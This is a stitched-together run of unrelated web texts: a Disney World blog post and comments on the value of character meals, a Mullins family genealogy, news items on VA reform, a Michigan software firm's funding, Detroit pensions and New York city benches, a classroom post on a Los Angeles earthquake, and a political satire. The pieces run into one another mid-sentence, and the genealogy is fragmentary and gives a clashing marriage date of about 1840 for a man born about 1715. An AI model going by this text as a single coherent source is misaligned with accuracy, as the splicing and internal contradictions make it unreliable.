by Brian McNichols 30 Comments
I have proven through my series of articles on Walt Disney World character meals that my family and I like to eat with Disney “celebrities.” The itch that I’ve been trying to scratch for quite some time is: are these things really worth it?
Granted, my kids love them and sometimes that’s enough…but sometimes it isn’t. Character dining is expensive, time consuming, and often featuring sub par food. On the other hand it offers a chance to kill two Disney activities with one Cinderella outfitted stone: eating a meal and meeting some characters. I have longed for the day when I could sit down and calculate the “true value” of a Disney World character meal.
Luckily, the very smart gentlemen at Mighty Men of Mouse (part of the TouringPlans.com Podcast Network!) did much of the work for me. A recent episode of theirs unveiled a simple yet interesting formula called a Leveraged Equity Number…or L.E.N.
What is L.E.N.
L.E.N. is calculated by adding the total cost of your hotel, tickets, and transportation and dividing this number by the total number of hours you plan on being “active” on your vacation (i.e. everything outside of your hotel room). The result is a cost per hour of your Disney vacation, which can be used to calculate the “cost” of things such as riding the bus or waiting in line.
Another item L.E.N can help quantify is the true cost of a character meal. The example I will be using for the purposes of this article is the Princess Storybook Dining at Akershus Royal Banquet Hall, which is found in the Norway pavilion of Epcot. There are a few reasons for this choice: 1) It is a meal I like and have done multiple times. 2) I feel that the lunch and dinner are decent values for character meals (decent food for only one arm and half a leg). And 3) The princesses in attendance can all be visited elsewhere, most of them in Epcot.
So, for an upcoming trip for my family of four (myself, my wife, my 4 year old daughter, and 2 year old son), I managed to find airfare for $562 total. Added to this are 2 adult and 1 child 7 day Park Hopper tickets valued at $1,156 and 7 nights in Port Orleans French Quarter at the cost of $1,123. The total cost is $2,841.
For each of the 6 full days (non-travel days) we will be in Walt Disney World I estimate that we will average 10 hours of being active, assuming we are out of the room at 8am, napping from 1pm-4pm, and back to the room at 9pm. To those 60 hours I added 6 hours for our arrival day. The $2,841 from above divided by the 66 hours equals a L.E.N. of $43.05. Therefore, each hour of my vacation is “worth” $43.05, whether I spend that hour eating, standing in line, or riding a bus.
The Real “Cost” of the Character Meal
When considering the value of a meal, the cost of the food must be considered in addition to the time. I will split the middle and use the price for an Akershus lunch (here is the all-you-care-to-eat menu), which is $38.99 for an adult and $23.99 for ages 3-10. Plus tax, tip, and alcoholic drinks, my family’s tab would be approximately $150. In addition, I am estimating one hour of eating and greeting time with the princesses. Therefore, with a L.E.N. of $43.05 (rounded to $43), the total cost of the Akershus lunch to me is $193.
The Alternative
If I choose to forego the character meal and meet each princess individually it can be done fairly easily. Snow White, Jasmine, Aurora, and Belle can all be met in Epcot’s World Showcase. Ariel can be found in her new grotto near the new Little Mermaid ride in the Magic Kingdom. Sure, Belle will not be in her ballgown and Ariel will have a mermaid fin, but to children those differences may not matter. Now the tricky part is estimating the time spent in line waiting to meet these five princesses, but I’ll save that for last.
Of course, we still have to eat. To substitute the lunch meal, I will consult the Tangerine Cafe menu in Morocco, which is one of my favorites. If I get the chicken and lamb combo, my wife gets the Chicken Wrap and we each get a beer that would come to approximately $40. My kids would eat food we bring to the park, and that’s not just me trying to be cheap, that is what they would honestly do. Naturally a counter service meal would also take less time, so I will estimate half an hour, making my L.E.N. for this meal $62.
So far the Akershus meal is costing $131 more, but now we come to actually meeting the princesses. The reason meet and greets are extremely hard to predict is because of the on and off nature of it. You may be in line for 10 minutes, then have to wait 15 while the characters take a break before you actually meet them. Alternatively you may just sneak in ahead of their break making the wait either 10 minutes or 25 depending on one spot in line.
Rather than attempt to guess at the wait, here is the break even point: At $43 per hour, that $131 difference works out to about 3 hours of time. That means about 37 minutes per each of the 5 princesses. I don’t know about you, but averaging 37 minutes per princess seems a little high.
Conclusion
Alright, so this isn’t as much a conclusion as it is a qualification. Based on the math, this particular character meal does not seem worth the time and money it costs. Other character meals will differ based on their costs and the availability of the characters. For instance, if you want to meet Lilo (from Lilo and Stitch) ‘Ohana at the Polynesian is the only place where she is commonly available. The value would be less important if meeting that particular Hawaiian sweetheart is your goal.
The most important thing to keep in mind however, is that the “active” time on vacation is a zero sum quantity, meaning that if I use 2 hours to visit princesses (an example, not necessarily a prediction) and 30 minutes to eat that is time spent not doing something else. The one and a half hours extra that plan costs compared to the time of the Akershus meal could be time I would spend on other attractions or meeting additional characters. To properly quantify the value of a character meal I would need to map out my entire trip. I may come back and do that in the next few weeks, but that is definitely more intensive.
So, is a character meal worth it? It’s hard to say definitively, but the evidence is that it is at least close enough to strongly consider skipping them. The convenience of a character meal versus the potential food quality and savings of the alternative is an argument that this lowly analyst could not possibly settle.
What say you: Is character dining a saving grace or black hole from which money never returns?

At a character breakfast I am guaranteed face time with characters, I am eating, and I get to sit down. Meeting characters outside meet and greets can be happenstance and waiting for characters in meet and greet lines means I am standing (in line waiting), fidgeting which equals ride time lost. When we do go to the parks, our party consists of 3 adults including one who is in a wheelchair. I can only imagine what dealing with kiddos would be like….
I agree, the convenience factor makes up for a lot. Standing in line is no fun, even if it saves money
Whilst I can see this as potentially a useful exercise in some ways I can see many flaws. First it assumes you actually value meeting and greeting the characters at the restaurant and this depends on the guests attending. Second, if you go with children, character meals can impact a meal time and thus cost more in snacks if your kids spend more time interacting than actually paying attention to their meal.
Our family tend to circle the parks as we do normally and drop into lines to meet and greet when they are short-ish. For us, there are some key characters that you just cant miss and most of those can be found at Epcot Character Spot for a big win!
In short we like meeting and greeting, but that’s not the only reason we go to WDW so we spend very little time doing it. The overall cost of a character meal just isn’t worth what it returns which to us is a few signatures (maybe unique) and possibly hungry children.
If you don’t value meeting the characters at the restaurant, a character meal is definitely not worth it. I do agree about the kids eating, but I find that to be a problem (at least with my kids) at every WDW meal. They are always distracted or looking toward what’s next rather than eating.
I’m with you, if we don’t do a character meal we very rarely meet the characters. I’m very line-averse
I love your analysis! From a purely economic standpoint, it makes lots of sense. However, it does presuppose that saving time and/or money is your key goal. For many guests this will be the case. But some folks will prioritize other things such as peace of mind (I KNOW my daughter will get to see Belle), comfort (sitting rather than standing while waiting), access to air conditioning, novelty (I’ve been dying to try this new place), family tradition (we always eat at Akershus; that’s what vacation means to us), or any number of other factors.
Nevertheless, this is a terrific tool to add to any trip planning arsenal.
Agreed, and there should be more to a Disney vacation than saving time or money. I just like statistics
We actually have a lunch booked here -Cinderella’s Royal Table was of course booked
– but we are going during the free dining plan time frame. We got the Disney dining so this particular restaurant costs us only the equivalent of 1 table service meal. So I would think under certain circumstances then the character dining might be more cost efficient? We have never been so I do not really know how much interaction we will get with the characters?
First, Akershus is a great value under the dining plan. At one credit versus Cinderella’s two it’s, for all intents and purposes, half the price. This analysis really does not factor in the dining plan.
Second, the character interaction is very good. Each princess will come right to the table and spend a minute or two talking and taking pictures. It’s quite enjoyable.
Your analysis did not address one factor: early admission to a park on a day when early admission is not otherwise available. That enables my group to have breakfast and be deep into a park when it opens. Of course one needs to get up early to do this but, I consider it to be quite a benefit.
Great point! I totally missed that advantage.
This is the benefit that tips the scale for us in favor of continuing to do character dining. We only do character dining for breakfasts.
I totally agree. We did two before-the-park-opens breakfasts our last trip and have two more scheduled for our next trip coming up in early Dec. It’s great to get photos, you’re not wasting time you could have spent on attractions, and when you’re done you can ride with no lines.
I personally see great value in character dining especially if you add a Disney dining plan to your vacation package. I hate waiting in line! So to be able to sit down, have someone bring me food, and each of the characters come to me is completely worth it in my book. I feel it is a much more relaxed setting for the characters to interact with my child and the personal attention they give is wonderful. When you stand in line and then get up to meet the character you see all the people waiting in line behind you and you feel rushed. Don’t forget you also get a 5×7 photograph with Belle at Akershus. And if you are celebrating your birthday a special treat and a birthday card signed by all the princess. So my vote is take a load off. Your at Disney, it’s not cheap, sit back and enjoy the experience and let those character come to you!!
Great Article!!! I loved the Mighty Men of Mouse episode when they discussed the L.E.N. it was nice to see it put to use in a blog post.
The L.E.N. is just one tool. As many have pointed out lots of things should go into considering if a character meal is right for you or your family. Either way, and however you choose to evaluate things, I think the L.E.N. is a great tool to have at your disposal.
Somewhere like Akershus would also include the photo keepsake, which I think is a nice souvenir that should be factored in to the value
With the PhotoPass Plus, photo packages at multiple character meals are included.
Haha I think I’m pretty well versed on PP+
I am a local so I’m talking about people that pay cash for dining
One sort of incalculable thing about a character meal is the quality of the characters/cast members. We had breakfast at the Grand Floridian with Mary Poppins and Tigger was one of the characters there, and he was sensational. He was so animated, knew the character inside and out and paid attention to the reactions. It made it a much more special experience for us and our kids. But that’s such a random chance, it’s impossible to plan. If it had just been a “regular” Tigger, we probably would have found the breakfast to be very expensive for what we got.
So, if you’re going to WDW for the first time and trying to figure out if/when to go to a character breakfast, make the reservations for the ones you’re interested in, with the first being one with a character you or your kids really want to meet. Gauge how that goes, and if your kids are scared or just not into it, you can cancel the reservations (just be sure you do it in time so you don’t get charged).
One strategy I heard someone use is to go to the park early, but make a character breakfast reservation for later in the morning. I think they got a muffin/scone/fruit/etc. at the bakery early to keep from being too hungry, but would be ready to eat at the later breakfast.
They did it because it likely won’t be as busy, so the characters can linger and/or get to you faster, plus you can save by not needing a big lunch, too. It’s not for everyone, but it makes sense if you can go without a big meal early.

So I loved this analysis. The quantitative nerd in me was drooling. A few notes:
1. Vacation days are not a zero sum, at least for a lot of people. Many companies have options to buy or sell extra vacation time, so you could actually calculate the cost of waiting in lines and taking an extra day of vacation, vs. doing 5 character meals.
2. You need to look at it from a marginal cost perspective. Adding an additional day to tickets gets cheaper as well as you don’t add anything to airfare generally the more days you stay. It may be marginally cheaper to extend your trip one more night from returning Saturday to returning Sunday, than character meals cost.
3. All of the other details people brought up: decrease in risk (you know you are meeting Belle), comfort (AC and seating), family tradition could all be given $ values based on utility and thus factored into your analysis.
Now aren’t you all glad you don’t have to go on vacation with me and me spreadsheet
We’ve done many character meals, and after our last trip (where we did 5 character meals) we decided to not do more than two on our next trip. I am a big scrapbooking girl, and my main problem was this: Character meal photos are terrible. There are always people wide mouthed eating in the background, and even if there is no one in the background, the clear ‘restaurant’ background is just not good for photos.
We did 1900 Park Fare dinner, and the pics were terrible, and we had to get the step sisters and mother all separately, this takes up valuable scrapbooking realestate. In the park, there is rarely a line longer than 10 minutes for all three of these crabby ladies, right outside the castle, making just one wonderful picture.
The Garden Grill has the absolute best picture opportunities (if you are in a bottom level booth) because there are no tables or people to get in your shot, and the different scenes from Living with the Land gave us the best backgrounds. You couldn’t tell that we were in a restaurant, and it was just my beautiful kids and the characters. We will do this one again for sure (even though it was my least favorite food of any character meal).
We will also eat breakfast again at cinderella’s castle, because my children value eating in the castle as a highlight of the trip. Plus, the line for Jasmine outside of a character meal can get crazy, the same with Ariel’s Grotto. The grotto can get more than an hour wait! Plus, you get a gorgeous photo with Cinderella with a beautiful background, and I have truly enjoyed the breakfast food each time I’ve eaten here.
I’m not sure about the scrapbooking but i would add something about the setting of each meals. my daughter is a HUGE cinderella fanatic and cannot wait to eat at her castle. something that may not be quantifiable but definitely worth the extra money.
One of the many things I enjoy about this website and the books is how they create logorythms for just about any metric of a WDW experience. And how we’re all free to utilize or ignore the well-researched advice. It’s usually a fasinating read, even if I know I’m going to overpay and eat too much average food at Cinderella’s Castle because my now-adult daughter and I Just. Love. Every. Moment.
Of course, I’ll use the same column to brush off the character meal at Akershus. We humans are funny like that, aren’t we?
We have no kids, so character meals aren’t a huge priority for us. The quality of the food is a major factor – we aren’t paying $$$ for a mediocre meal just to meet Mickey. But we figured that at some point in our lives we wanted to have the experience of attending a character meal. So far we’ve had two character meals.
Lunch at Tusker House in Animal Kingdom was pretty good – some of the food was more interesting than standard buffet fare, albeit not as interesting as at Boma, and the character experience was fun.
Breakfast at Cape May Cafe was awesome – the food was fresh and tasty, the selection was quite varied, the atmosphere was peaceful even with numerous excited kids running about, and the character experience was fun.
Both meals gave us a chance to relax and actually meet characters – since we have no kids, waiting in line for character experiences in the parks isn’t something we care to do. Character meals aren’t something I need to do every trip, but every now and then I think it’s worth the extra money.
Another thing that can’t be measured in this is rest time. We have a 9 and 6 year old and scheduling a lunch or dinner meal forces the kids to rest for an hour and get re-energized. They don’t want to go back to the hotel for 3 hours to rest, but a QSR for 20mins doesn’t always do the trick. So a sit down meal is usually ideal.
We also are a family that likes to do pre-opening breakfasts also.
I Love This Article – It definitely speaks to the math nerd in me! I will do the L.E.N. on all of my vacations from now on! We schedule several character meals because these are our afternoon breaks instead of going back to the hotel. They also eliminate us having to stand in line for any of the characters. The kids love them and we have some great pictures that we wouldn’t have taken otherwise. My number 1 reason is that I don’t want to waste any ride time standing in who-knows-how-long-of-a-line you’ll be standing in for characters. My ride time is ‘Priceless’ to me! I need to do this for FDD also because we try to take advantage of that whenever we can. Thanks for the article!!
Very interesting. Using this formula, I divided up my hotel, plane tickets, park tickets, and rental car. Then I factored in the amount of hours I spent at Epcot and the cost of each beer to determine that on the day I went to Epcot and drank around the world, I actually spent $19.50 on each beer. It was still worth it.
We just came back from a 7 day visit to WDW where we did three character meals and we have done many in past visits. Last year I would have said yes, you must to character meals. However, I have changed my tune. I would say they are not worth it if you go during a slower time. We had better character interaction with the characters we waited in line for, plus had photo pass pictures. The food at the character meals is always mediocre, at best, and the characters spend very little time at your table. As for rest, kids don’t rest at these meals. They are too excited to eat, the restaurants are loud, and us parents are on constant character look-out. Thus, not an enjoyable meal.I will only do Cinderella’s Royal Table in the castle again. One, because it is the castle and two, we had better character interaction there.Descendants of Matthew Mullins of King William County, Virginia
by Cornelius Carroll
First Generation
1. Matthew Mullins b. ca 1680 is listed in "English Duplicates of Lost Virginia Records" by Louis des Cognets, Jr., Title Upon Indian Leases (June 1699) with 150 acres that had been leased to Thomas Ward and then assigned to him. In "Cavaliers and Pioneers, Abstracts of Virginia Land Patents and Grants, 1695-1732" in Patent Book 9, page 45; Matthew Mullins received 268 acres in Pamunkey Neck, King and Queen County, Virginia, beginning at the mouth of a branch of Cannoe Branch of Nickatawance, on the Mill Road, near the head of Mullen's Branch, 25 April 1701, for the transport of 6 persons: Lydia Glover, Josias Marshall, Joseph Boston, Robert Buttris, Matthew Mullins, and Thomas Gears.

Determined that plaintiff sustained damages of 4 pounds, 10 shilling & is to recover plus 15 shillings and 496 pounds of tobacco. 11 Dec. 1747. In debt case of William Hopkins against Richard Mullins, defendants fails to appear, judgment entered for the plaintiff for 12 pounds, 6 pence, costs. 10 June 1748. In debt case of William Hopkins against Richard Mullins, defendant still fails to appear, plaintiff awarded Alias Attachment for 12 pounds, 6 pence, and costs. In Halifax County, Virginia Plea Book 1, 1752-1755, the following records appear on Richard Mullins: 20 Dec. 1752. On petition of Joseph Mays by Clement Read his attorney vs Richard Mullins, defendant not found, plaintiff granted a new process. Feb. 1753. The petition of Joseph Mays vs Richard Mullins, defendant, given unto this court, now called and not appearing, plaintiff by Clement Read his attorney granted a new process. June 1753. On petition of Joseph Mays vs Richard Mullins, the sheriff returned said defendant is in Lunenburg County, plaintiff by his attorney granted a new process. 17 July 1753.

3. Patrick Mullins b. ca 1704 Virginia md Mary (maiden name unknown). Patrick Mollin (Mullins) appears in the tithable lists of the vestry book of King William Parish among those who were not French Patentees in 1720. Patrick received a land grant of 350 acres in Goochland County, Virginia, on the upper side of Byrd Creek 28 Sept. 1729. Goochland County was formed in 1728 from Henrico County, from the portion west of Tuckahoe Creek on the north side of the James River, and the portion west of Lower Manakin Creek south of the James River. In 1744, Albemarle County was formed from the western portion of Goochland County. Patrick Mullins, of Goochland County, made a deed to John Deheny, of Hanover County, for 35 pounds, 350 acres granted to said Mullins by patent dated 28 Sept. 1728 on Byrd Creek, on 14 Jan. 1734.

Patrick deeded Moses Damron, for 35 pounds, 60 acres in Rowan County on the north side of Dan River, part of a tract of 325 acres obtained by a deed from the Earl of Granville dated 15 March 1756, on 2 Feb. 1767. The witnesses were: Hugh Dennum, Thomas (T) Rogers, and William (M) Mullings. Patrick deeded William Johnson, for 35 pounds, about 70 acres on the north side of Dan River in 1767. The witnesses were Noble Ladd and Hugh Dennum. Patrick made a deed to Thomas Mullings for 120 acres on 16 July 1766. Patrick also made a deed to E. Conely. John Cox sold land to William Mullins. Surry County was formed from the western portion of Rowan County in 1770. William Mullins and his wife Rebecker sold James Davis, for 53 pounds, 66 acres on the south side of Dan River in 1774. Guilford County was formed from the eastern portion of Rowan County and the western portion of Orange County in 1770. Rockingham County was formed from the northern portion of Guilford County in 1785. Thomas Mullins, of Guilford County, sold William Davis, for 125 pounds, 120 acres on the south side of Dan River above upper Saura Town, land Thomas Mullins had from Patrick Mullins, his father, by deed dated 16 July 1766, part of Granville Grant to Patrick Mullins, adjoining Enoch Conley, up river to Punchin Camp, on 16 March 1773. The witnesses were: William Mullins and William Chambers. In 1771, Thomas Mullins received a deed from John Mullins. And, in 1779, Patrick Mullen and William Mullins received land grants from the state of North Carolina. Patrick Mullins is in the 1790 and 1800 Rockingham County, North Carolina Censuses. Patrick and Mary may have had the following children:
10. i. John Mullins b. ca 1735 Virginia
11. ii. Thomas Mullins b. ca 1736 Virginia
12. iii. Valentine Mullins b. ca 1725 Virginia
13. iv. Patrick Mullins
14. v. David Mullins b. ca 1750 Virginia - d. 1820-1830 md Susannah Herndon
15. vi. William Mullins md Rebecca
4. Matthew Mullins b. ca 1715 Virginia - d. 1786 Albemarle County, Virginia md Mary Maupin b. ca 1723 Hanover County, Virginia - d. ca 1800 Virginia, daughter of Daniel & Margaret (Via) Maupin. Her father Daniel Maupin was born ca 1695 in Amsterdam, Holland (the Netherlands) to Gabriel Maupin (b. ca 1666 Garjau, France) & Marie (Hersent) Maupin (b. ca 1666 at/near Rouen, France). Gabriel Maupin and family came to the Huguenot settlement at Manakintown, in Virginia, 1699-1700 after passing through Spittalsfield (now Bethnell Green) "suburb" of London in the late 1690s. Gabriel died in Williamsburg, Virginia, and his wife remarried Thomas Crease. Daniel Maupin patented land on Moormans River in 1748. He died in 1788. He and wife Margaret had 7 sons and 3 daughters, one of whom was Mary who md Matthew Mullins. Matthew Mullins and Mary Maupin married ca 1840. Henning's Statutes, Vol. VII, page 203 shows Matthew Mullins and his two sons, John and William, served in the Virginia Militia, in Albemarle County, ranging the frontier against Indians during the French and Indian War. Matthew later served three years as a sergeant in the American Army during the Revolutionary War in Captain William Croghan's Company of the consolidated 4th, 8th, and 12th regiments of the Virginia troops commanded by Colonel James Woods. The Patridge store accounts of Hanover County show that Matthew "Mathias" Mullins paid his account on 22 March 1736. In 1746, Matthew Mullins was apparently omitted from a list of tithables and the court ordered his tithes be entered. In 1748, Matthew Mullins, William Lewis, Gabriel Thompson, and Abraham Shatteen to value improvements to Charles Mill's land. In 1752, Matthew Mullins entered 190 acres on the east end of Buck's Elbow on the south side of Moorman River in the survey book of Albemarle County, Virginia. In 1755, he entered 92 acres on the branches of Mooremans River adjacent to Daniel Maupin, John Mullins, and Robert Miller.

Florida Delegation Rallies Behind VA Reform Agreement.
While he does not serve on the Veterans Affairs Committee, U.S. Sen. Marco Rubio, R-Fla., had been part of the team which was trying to find common ground between the various VA agreements emerging from the Democratic-controlled Senate and the GOP-led House.
Rubio gave Miller high praise for his leadership on the matter after the agreement was announced.
“Despite the dysfunction it exhibited at times, it’s been my honor to serve on this conference committee,” Rubio said on Monday night. “I also want to take this opportunity to commend Congressman Jeff Miller, the lead Republican negotiator on this committee. I’ve known Jeff for many years and had the privilege of working with him in the Florida House. I’ve always known that Jeff Miller is the real deal when it comes to public service, and this experience further solidified that impression. Florida’s Panhandle, our entire state and all our veterans are fortunate to have Jeff Miller championing their causes.”
Rubio also gave the agreement good marks, noting it would allow more veterans increased options to medical care.
“This VA reform agreement is an important step forward to begin addressing the dysfunction and incompetence that are plaguing our VA system and hurting our veterans,” Rubio said. “By providing our veterans with more doctor choices outside the VA system, this takes significant steps to make sure that those who have served our country aren’t condemned to endless waiting times just to get an appointment.”
Rubio weighed in on his proposal to allow the VA secretary to fire incompetent employees. Rubio’s proposal was included in the final agreement though it has been altered to allow more appeals.
“I have fought to reform the VA, and a key part of this fight has been to hold bad managers accountable,” Rubio said. “After the scandal erupted earlier this year, my biggest priority was to make sure that my legislation making it easier to fire incompetent, negligent or dishonest managers was included in any reform. During the conference committee, I’m proud that this provision became even stronger than what the Senate passed earlier this year. It’s time to end the shameful VA status quo that has made it easier for bad workers to receive bonuses than get fired.”
At the other end of Capitol Hill, U.S. Rep. Corrine Brown, D-Fla., currently the longest-tenured member of the Veterans Affairs Committee, said she backed the agreement.
“The bill includes critical language that I discussed with Senate Chairman Bernie Sanders to ensure the VA has final authority over the care that veterans receive whether at the VA or at non-VA providers,” Brown said on Monday night. “We need to continue to work with our veteran stakeholders to ensure the VA has all the resources it needs to provide superior health care to our veterans. This includes providing the necessary resources to address the ever increasing population of women veterans.”
Brown also insisted the agreement would improve services and wait times for veterans at VA medical centers.
“The conference report includes important provisions, including appointing a presidential commission to examine veterans access to health care; creating a task force to make recommendations on updating the scheduling software; and improving access to health care services, such as telemedicine, through the operation of mobile vet centers and mobile medical units,” Brown said. “These provisions, along with other VA health-care service enhancements, will address the wait time issue and make the improvements necessary to benefit all veterans.”
Brown also predicted that the Senate would confirm Robert McDonald, whose nomination sailed through the Veterans Affairs Committee without any opposition, as VA secretary this week.
“I look forward to the new VA secretary being confirmed by the Senate this week and I pledge to work with him, the committee and all the veteran service organizations to make sure our vets are getting the high-quality care they were promised and deserve,” Brown said. “The VA provides quality, timely health care to our veterans. We have a duty to make sure that all those who have defended this country when called upon receive the care they have earned through their service.”

What Do You Think?GRAND RAPIDS, MI — A local tech firm that makes software monitoring products for Fortune 500 companies is going through a growth spurt this year after getting an infusion of cash from a pair of West Michigan venture capital funds.
Blue Medora, a software development company that spun-off from Atomic Object in 2008, got a combined $1.25 million from Start Garden and Grand Angels this week, money that company CEO Nathan Owens said will help the firm expand into new markets.
While the $750,000 Grand Angels chunk represents the largest investment portion, the $500,000 from Start Garden marks the largest single investment by Rick DeVos’ firm to date, and is the latest in a series of recent gambles on more seasoned, second-stage companies demonstrating market potential.
“With the Blue Medora investment, we invested aggressively into seasoned entrepreneurs working in a space with huge potential that they know very well,” said DeVos.
Blue Medora writes plugin efficiency software that helps larger companies manage databases and monitor internal infrastructure using systems like Oracle Enterprise Manager and IBM Tivoli. Among other things, such programs help companies understand available data storage capacity, avoid server crashes and optimize applications so the company can do more with the software they already have, said Owens.
Global enterprise monitoring is a “multi-billion dollar."
“It’s definitely not as dynamic as, say, the mobile applications market, where you develop something today and three months later it’s out of date,” Owens said.
The market for monitoring software tends to be more stable because large companies tend to adopt new technology at a slower rate, he said. That allows firms like Blue Medora to evolve products over a period of several years without the constant worry of immediate obsolescence.
“Companies tend to buy these packages and keep them a long time,” he said. “They don’t like a lot of constant change.”
Today, Blue Medora has 22 employees and hopes to grow that number to 35 by mid-2014 using the new growth capital. Owens started the business in 2007, incubating the company at Atomic Object, a surging web development firm headquartered on Wealthy Street SE with offices in Detroit.
Owens took the company standalone in 2008 when IBM liked their first product, a monitoring solution for the PeopleSoft Oracle package, which IBM decided to sell under its own name to customers.
Owens has expanded the relationship with the multinational tech giant since then and has been recently branching into larger relationships with Oracle, which is the world’s third largest software maker by revenue, behind Microsoft and IBM.
He said Blue Medora, with a client list around 50, is gaining velocity in the marketplace and beginning to attract the attention of analyst groups like IDC and Gartner.
“Systems management is rapidly evolving," he said. "Companies are moving away from single solution systems management and demanding more customization and integration into cloud-based solutions like VMware.”
Owens said his staff is almost entirely comprised of graduates from Michigan universities like Grand Valley State, Western Michigan, Eastern Michigan, Central Michigan and Michigan Tech
“We’re finding a good pipeline of talent coming out the (computer science) programs in those schools.”TCTI: Too Crazy To Ignore

Can retirement money just vanish?
It was the latest humiliation for the city of Detroit.
"A shocker in the courtroom! The Michigan constitution does not protect pensions," exclaimed WWJ's Charlie Langton after a judge ruled that the City of Detroit, $18 billion in debt, can go into bankruptcy.
Which means the pensions and health plans of former city employees could be cut to pay Detroit's bills.
That's bad news for former workers like David Sole, "We think taking a dime or a dollar is too much. The banks are considered secure creditors - were garbage."
And it's bad news for David Allen, a firefighter who was injured when a building collapsed on him, "I feel betrayed. I feel short-changed, I feel angry."
Angry - because he and other Detroit retirees could see their pension checks cut by 84 percent from what they expected to get.
It's down to a choice between paying the people who used to work for the city, or paying the people the city needs now.
How bad is it? "The short-handed police take 58 minutes on average to respond to a call for help here, and 40 percent of the street lights are out," reports CBS Correspondent Dean Reynolds.
And the message to Detroit's 20,000 retirees - and to present and future retirees anywhere - is pretty simple: despite this idea that a pension is a guarantee, it turns out to be like any other promise. It's only as good as the organization that backs it.2/9/2004

This week, a small crack unzipped under the Santa Monica Mountains north of Los Angeles, waking millions of people with a magnitude 4.4 earthquake. (LiveScience)
Feel the Earth move under your feet? Watch “Earthquakes 101″ to understand why.
The USGS makes som pretty maps, don’t they? The St. Patrick’s Day “Shamrock Shake” jolted the Southern California coast just north of Encino, colored green on this lovely map. The red lines are, of course, California’s jigsaw of (geologic) faults. The famous San Andreas fault is the long diagonal just south of Lancaster.

Discussion Ideas
- Read through the short, great LiveScience article, then take a quick look at the overview of earthquakes in our “Forces of Nature” interactive. (Earthquakes are the final “force of nature”, with the seismograph icon in the upper left.) Click on slide four. It lists the four major types of faults: normal, reverse, strike-slip, and dip-slip. What type of fault was responsible for Southern California’s “Shamrock Shake”?
- Trick question! The answer isn’t on there. Coastal California is a mess of all kinds of geologic faults. (My favorite? The Mendocino Triple Junction!) The most prominent faults, such as the San Andreas and the Hayward, are strike-slip faults. However, the Shamrock Shake probably wasn’t a direct result of the San Andreas. It was more likely the result of transpression activity. To quote the geologist in the LiveScience article, the Shamrock Shake “might . . . have alleviated squeezing caused by the San Andreas Fault’s big bend . . ..”
- Geology is awesome.
- Why are Angelenos and geologists calling this week’s earthquake the “Shamrock Shake”?
- It happened on St. Patrick’s Day, of course! They could have also called it the Holi Roller . . . (Holi fell on March 17 this year.)
- According to “Forces of Nature,” both earthquakes and volcanoes are associated with plate tectonics, the movement of tectonic plates—Earth’s giant slabs of crustal rock. (The Shamrock Shake was the result of a minor interaction between the Pacific and North American plates.) Take a look at our MapMaker Interactive, displaying tectonic plates, earthquakes, and volcanoes. There is a lot of overlap! However, while the California Coast has experienced dozens of earthquakes (blue circles on the map), it has not experienced any recent volcanic activity. (That lone red triangle up north is the 1980 Mount St. Helens eruption in Washington.) Why aren’t there any volcanoes in California?
- Well, there are. Mount Shasta is a big, beautiful volcano. Lassen even erupted in the 20th century. Oh, you mean really active volcanoes . . .
- Most big faults in California are transform, strike-slip faults. Volcanoes are usually associated with other fault types. One such volcano-prone fault is what “Forces of Nature” calls a normal fault, where tectonic plates are ripping apart from one another. The mid-Atlantic Ridge is one such normal fault, and volcanoes are spectacularly common where the ridge divide the island nation of Iceland. Volcanoes are also associated with reverse faults, where tectonic plates are crashing together in my favorite geologic process, subduction. Beautiful Mount Fuji, Japan, and Krakatoa, Indonesia, are volcanoes in subduction zones.
- Along the California coast, “there is no ripping apart or subduction taking place,” so “there isn’t any magma formation to lead to volcanoes.”
Reblogged this on Shouts from the Abyss and commented:
I thought a Shamrock Shake was a chemical concoction invented by McDonalds to quench our thirst to quaff something green. Who knew? Here’s some info on the St. Patrick’s Day earthquake. The epicenter is indicated on the map with a star. As it happens, I’ve been to that exact spot many times. I believe there was a taco stand there. Good carne asada burritos. I have to believe that the location of this quake was no accident. It has to mean something!Driggers Fall Festival Survey & Thank You's

Pedestrian on bench (credit: 1010 WINS)
NEW YORK (CBSNewYork) — You’ll soon have more places to relax in the Big Apple.
The Department of Transportation has launched the CityBench program, and plans to install 1,000 benches across the five boroughs over the course of three years.
LISTEN: 1010 WINS’ John Montone reports
The first benches were unveiled last week at Chelsea’s Covello Senior Center. Each is made from carbon steel and sports three separate seats.
To designer Ignacio Ciocchini, they are places to stop and rest, wide enough to afford sitters personal space.
“The bench represents a space where you can sit and relax, so you can recharge your energy,” he told 1010 WINS’ John Montone.
Montone stood on Greenwich and Warren Streets to ask pedestrians what they thought of the benches, but many speed-walking New Yorkers were too busy to notice.
Asked if he could just stop and sit down, one man answered Montone: “No, I can’t. I have to get to a meeting.”
Another pedestrian was in such a rush, she didn’t even notice the bench.
“Rush, we’re all in a rush,” Diane said, although she did promise to give it a shot, tomorrow.
However, one man who did try out the bench, a carpenter from Glendale, gave it a positive review.
“It’s good…comfortable,” he told Montone.
What do you think of this bench initiative? Sound off in our comments section below….
An expression of this sense of community is our government. It's one thing to be critical of it, but it's quite another to say that government is always the enemy. I for one would be really, really happy to see some federal workers right about now. Especially if they brought antibiotics.
A government big enough to give you everything you want is big enough to take it all away - that's what Ronald Reagan said, and it's true. But having a government big enough to buy some rescue helicopters wouldn't be so bad, would it?
Many of my fellow Republicans have been saying we should roll back regulations, and let businesses make money so they can power our economy. I get that. But some regulations are necessary. Like that contractor who offered the lowest bid on the storm water drainage system. The government definitely should have regulated him. It should have regulated the hell out of him.
I still think we needed to make those budget cuts Paul Ryan wanted. We did that for our kids. But I've been doing some soul-searching after standing in my own urine for most of the night, and I've come to the conclusion that maybe raising some of those tax rates could have helped us cut a bit less of the important stuff, like funds for FEMA and equipment for first responders. It could be the hypothermia talking here, but maybe we should have let the Democrats have that one.
I guess I'm just rethinking my whole philosophy about the relationship between the individual and society as a whole. We don't just create every opportunity for ourselves by hard work and sheer willpower. We exist as part of an interdependent network of people - real human beings whose basic needs should be our concern, if we want to be a part of a society. That's why I truly believe we have to move beyond the selfishness of pure capitalism, and why I think you all should let me on your raft so I don't die.
(NOTE: This is dedicated to DMH, mostly because I stole the idea from him.)
This has been here for two weeks without a comment? For shame. Because it was brilliant.
It's a shame it took something so devastating happening to this person for this individual to understand something many of us have been saying for some time. We need community and we accomplish much more when we all contribute to the, yes, welfare of that community. The points are well taken and agreed with but I would encourage the writer to examine how those "cuts" he still supports will affect the greater community. Not all should be on the table.
You got linked by Patrick Nielsen Hayden at "Making Light." Congrats! Awesome post.
Hilarious. I changed my political philosophy after Katrina, so I know whereof you speak...
Too bad it usually takes a monumental event in a Republicans life to realize their philosophy is a myth.
